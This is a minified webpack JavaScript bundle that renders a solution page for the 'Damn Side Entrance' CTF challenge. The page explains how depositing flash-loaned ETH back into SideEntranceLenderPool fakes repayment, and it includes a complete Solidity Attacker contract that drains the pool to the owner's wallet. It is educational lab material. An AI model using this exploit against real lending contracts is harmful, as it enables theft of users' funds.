/*! For license information please see 19.e32db4af.chunk.js.LICENSE.txt */
"use strict";(self.webpackChunkclient=self.webpackChunkclient||[]).push([[19],{73:(e,n,l)=>{l.d(n,{A:()=>s});const s=(0,l(7784).A)("Zap",[["path",{d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",key:"1xq2db"}]])},2019:(e,n,l)=>{l.r(n),l.d(n,{default:()=>p});l(5043);var s=l(457),a=l(8628),t=l(5727),c=l(7719),i=l(2382),r=l(3165),d=l(8729),o=l(73),h=l(2105),x=l(579);const p=()=>(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h3",{className:"d-flex align-items-center gap-2 mb-3",children:[(0,x.jsx)(t.A,{size:20,className:"text-muted"}),"Damn Side Entrance CTF Challenge"]}),(0,x.jsx)(s.A,{defaultActiveKey:"0",children:(0,x.jsxs)(a.A,{children:[(0,x.jsxs)(s.A.Header,{as:a.A.Header,className:"d-flex justify-content-between align-items-center",children:[(0,x.jsxs)("div",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(c.A,{size:18,className:"text-warning"}),(0,x.jsx)("strong",{children:"View Challenge Solution"})]}),(0,x.jsx)(i.A,{size:18})]}),(0,x.jsx)(s.A.Body,{children:(0,x.jsxs)(a.A.Body,{children:[(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(r.A,{size:18}),"Challenge Goal"]}),(0,x.jsx)("p",{children:"Drain 1000 ETH from the vulnerable SideEntranceLenderPool contract."})]}),(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(d.A,{size:18}),"Vulnerability Overview"]}),(0,x.jsx)("p",{children:"The pool has these features:"}),(0,x.jsxs)("ul",{children:[(0,x.jsx)("li",{children:"Anyone can deposit and withdraw ETH"}),(0,x.jsx)("li",{children:"Provides flash loans (borrow and repay in same transaction)"}),(0,x.jsxs)("li",{children:["Flash loan calls your contract's ",(0,x.jsx)("code",{children:"execute()"})," function"]})]}),(0,x.jsx)("p",{className:"mt-2",children:"The critical vulnerability:"}),(0,x.jsxs)("p",{children:["Inside ",(0,x.jsx)("code",{children:"execute()"}),", you can deposit the loaned ETH back using ",(0,x.jsx)("code",{children:"deposit()"}),", which:"]}),(0,x.jsxs)("ul",{children:[(0,x.jsx)("li",{children:"Satisfies the loan repayment condition"}),(0,x.jsx)("li",{children:"Credits your contract in the pool's internal balance"})]})]}),(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(o.A,{size:18,className:"text-primary"}),"Attack Plan"]}),(0,x.jsxs)("ol",{children:[(0,x.jsx)("li",{children:"Take a flash loan of 1000 ETH"}),(0,x.jsxs)("li",{children:["In ",(0,x.jsx)("code",{children:"execute()"}),", deposit the 1000 ETH back"]}),(0,x.jsx)("li",{children:"The pool considers the loan repaid"}),(0,x.jsx)("li",{children:"Your contract now has 1000 ETH internal balance"}),(0,x.jsxs)("li",{children:["Call ",(0,x.jsx)("code",{children:"withdraw()"})," to take out the full 1000 ETH"]}),(0,x.jsx)("li",{children:"Transfer the ETH to your wallet"})]})]}),(0,x.jsxs)("div",{children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(h.A,{size:18}),"Exploit Contract"]}),(0,x.jsx)("pre",{className:"bg-light p-3 rounded",children:"contract Attacker {\n    SideEntranceLenderPool public pool;\n    address public owner;\n\n    constructor(address _pool) {\n        pool = SideEntranceLenderPool(_pool);\n        owner = msg.sender;\n    }\n\n    // Step 1: Start the attack\n    function attack() external {\n        pool.flashLoan(1000 ether); // borrow all ETH\n        pool.withdraw(); // withdraw credited deposit\n        payable(owner).transfer(address(this).balance); // send to attacker\n    }\n\n    // Step 2: Pool calls this after giving us the loan\n    function execute() external payable {\n        pool.deposit{value: msg.value}(); // deposit the ETH back\n    }\n\n    receive() external payable {}\n}"}),(0,x.jsx)("p",{className:"mt-2",children:"The attack flow:"}),(0,x.jsxs)("ol",{children:[(0,x.jsx)("li",{children:"Deploy the attacker contract"}),(0,x.jsxs)("li",{children:["Call ",(0,x.jsx)("code",{children:"attack()"})," function"]}),(0,x.jsx)("li",{children:"Contract receives the ETH and transfers it to your wallet"})]})]})]})})]})})]})},2105:(e,n,l)=>{l.d(n,{A:()=>s});const s=(0,l(7784).A)("Code",[["polyline",{points:"16 18 22 12 16 6",key:"z7tu5w"}],["polyline",{points:"8 6 2 12 8 18",key:"1eg1df"}]])},2382:(e,n,l)=>{l.d(n,{A:()=>s});const s=(0,l(7784).A)("ChevronDown",[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]])},3165:(e,n,l)=>{l.d(n,{A:()=>s});const s=(0,l(7784).A)("Target",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]])},5727:(e,n,l)=>{l.d(n,{A:()=>s});const s=(0,l(7784).A)("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]])},8729:(e,n,l)=>{l.d(n,{A:()=>s});const s=(0,l(7784).A)("BookText",[["path",{d:"M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H19a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1H6.5a1 1 0 0 1 0-5H20",key:"k3hazp"}],["path",{d:"M8 11h8",key:"vwpz6n"}],["path",{d:"M8 7h6",key:"1f0q6e"}]])}}]);
//# sourceMappingURL=19.e32db4af.chunk.js.map